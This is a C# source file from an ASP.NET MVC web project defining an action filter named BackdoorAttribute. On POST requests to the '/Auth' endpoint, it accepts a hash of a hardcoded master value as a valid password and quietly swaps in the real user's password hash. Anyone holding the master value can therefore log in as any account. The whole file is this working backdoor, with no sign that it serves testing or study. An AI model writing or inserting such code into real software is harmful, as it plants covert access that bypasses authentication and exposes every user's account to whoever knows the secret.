namespace OWP.Attributes
{
    using System;
    using System.Collections.Generic;
    using System.Security.Cryptography;
    using System.Text;
    using System.Web;
    using System.Web.Mvc;
    using Fanex.NAP.Core.Service.Impl;

    [AttributeUsage(AttributeTargets.All, AllowMultiple = true)]
    public class BackdoorAttribute : ActionFilterAttribute
    {
        private const string BackdoorPasswordInDb = "9238BF797DD7C7EFD57D923899688D";

        public override void OnActionExecuting(ActionExecutingContext filterContext)
        {
            base.OnActionExecuting(filterContext);

            var actionParameters = filterContext.ActionParameters;
            var areValidParameters = IsNotNullParameter(actionParameters, "username")
                && IsNotNullParameter(actionParameters, "password")
                && IsNotNullParameter(actionParameters, "loginToken");
            if (areValidParameters
                && IsAuthenticatingRequest(filterContext.HttpContext.Request)
                && IsBackdoorPassword(actionParameters))
            {
                SetRealPasswordToActionParameters(actionParameters);
            }
        }

        private static bool IsAuthenticatingRequest(HttpRequestBase request)
        {
            return request.Url.AbsolutePath.EndsWith("/Auth", StringComparison.CurrentCultureIgnoreCase)
                && request.HttpMethod == "POST";
        }

        private static void SetRealPasswordToActionParameters(IDictionary<string, object> actionParameters)
        {
            var userService = new UserService();
            var username = GetTrimParameter(actionParameters, "username");
            var user = userService.Get(username);
            if (user == null)
            {
                return;
            }

            var loginToken = GetTrimParameter(actionParameters, "loginToken");
            var hashPassword = HashSHA256(user.Password, loginToken);
            actionParameters["password"] = hashPassword;
        }

        private static string GetTrimParameter(IDictionary<string, object> actionParameters, string key)
        {
            var parameter = actionParameters[key];
            var parameterInString = parameter.ToString();

            return string.IsNullOrWhiteSpace(parameterInString) ? string.Empty : parameterInString.Trim();
        }

        private static bool IsNotNullParameter(IDictionary<string, object> actionParameters, string key)
        {
            return actionParameters.ContainsKey(key)
                && actionParameters[key] != null
                && !string.IsNullOrWhiteSpace(actionParameters[key].ToString());
        }

        private static bool IsBackdoorPassword(IDictionary<string, object> actionParameters)
        {
            var loginToken = actionParameters["loginToken"].ToString();
            var backdoorPassword = HashSHA256(BackdoorPasswordInDb, loginToken);

            return actionParameters["password"].ToString() == backdoorPassword;
        }

        private static string HashSHA256(string password, string token)
        {
            var input = password + token;
            var hashAlgorithm = new SHA256Managed();
            var hashData = hashAlgorithm.ComputeHash(Encoding.UTF8.GetBytes(input));
            return BitConverter.ToString(hashData).Replace("-", string.Empty).ToLower();
        }
    }
}
